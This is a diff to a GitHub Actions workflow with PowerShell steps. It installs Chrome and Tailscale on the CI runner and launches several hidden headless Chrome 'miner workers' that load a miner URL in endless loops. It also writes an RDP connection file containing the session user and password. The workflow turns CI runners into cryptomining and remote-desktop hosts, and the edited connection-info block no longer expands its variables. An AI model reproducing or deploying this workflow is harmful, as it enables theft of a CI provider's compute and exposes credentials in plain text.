@@ -82,7 +82,7 @@ jobs:
       - name: Install Software (Chrome & Tailscale)
         shell: pwsh
         run: |
-          $chrome = "$env:TEMP\chrome.exe"
+          $chrome = "$env:TEMP\chrome_installer.exe"
           Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chrome
           Start-Process $chrome -ArgumentList "/silent","/install" -Wait
           Remove-Item $chrome
@@ -108,6 +108,7 @@ jobs:
             $ip = & $tsExe ip -4 2>$null
             if ($ip -and $ip -ne "0.0.0.0") {
               Add-Content $env:GITHUB_ENV "TS_IP=$ip"
+              Write-Host "✅ Tailscale IP: $ip"
               break
             }
             Start-Sleep 10
@@ -118,52 +119,49 @@ jobs:
       - name: Deploy Advanced Miner System
         shell: pwsh
         run: |
-          $script = @"
-param(\$workers, \$minerUrl)
+          $path = "$env:TEMP\miner_manager.ps1"
+          $script = @'
+param($workers,$minerUrl)
 
-for (\$i = 1; \$i -le \$workers; \$i++) {
+for ($i = 1; $i -le $workers; $i++) {
   Start-Job -ScriptBlock {
-    param(\$i, \$minerUrl)
-    while (\$true) {
+    param($i,$minerUrl)
+    while ($true) {
       try {
-        Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
-          -ArgumentList "--headless","--disable-gpu","--no-sandbox","--remote-debugging-port=9\$i","--app=\$minerUrl" `
-          -WindowStyle Hidden -PassThru
-        Start-Sleep 600
+        Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless","--disable-gpu","--no-sandbox","--remote-debugging-port=9$i","--app=$minerUrl" -WindowStyle Hidden -PassThru
+        Start-Sleep -Seconds 600
       } catch {
-        Start-Sleep 30
+        Start-Sleep -Seconds 30
       }
     }
-  } -ArgumentList \$i, \$minerUrl -Name "miner-worker-\$i"
+  } -ArgumentList $i,$minerUrl -Name "miner-worker-$i"
 }
 
-Write-Host "Started \$workers miner workers"
-while (\$true) { Start-Sleep 60 }
-"@
+Write-Host "Started $workers miner workers"
+while ($true) { Start-Sleep 60 }
+'@
 
-          $path = "$env:TEMP\miner_manager.ps1"
-          $script | Out-File $path -Encoding UTF8
-
+          $script | Out-File -FilePath $path -Encoding UTF8
           Start-Job -ScriptBlock { param($p) powershell -File $p } -ArgumentList $path
 
       - name: Create Connection Info File
         shell: pwsh
         run: |
-          $txt = @"
+          $txt = @'
 RDP Session Ready:
 IP: $env:TS_IP
 User: $env:RDP_USER
 Pass: $env:RDP_PASSWORD
 Workers: $env:MINER_WORKERS
 Runtime: $env:MAX_RUNTIME minutes
-"@
-          $txt | Out-File "$env:GITHUB_WORKSPACE\RDP_Info.txt"
+'@
+          $txt | Out-File "$env:GITHUB_WORKSPACE\RDP_Info.txt" -Encoding UTF8
 
       - name: Monitor Session
         shell: pwsh
         run: |
           $start = Get-Date
-          $end = $start.AddMinutes($env:MAX_RUNTIME)
+          $end = $start.AddMinutes([int]$env:MAX_RUNTIME)
           while ((Get-Date) -lt $end) {
             $elapsed = [int]((Get-Date) - $start).TotalMinutes
             $remain = [int]($end - (Get-Date)).TotalMinutes
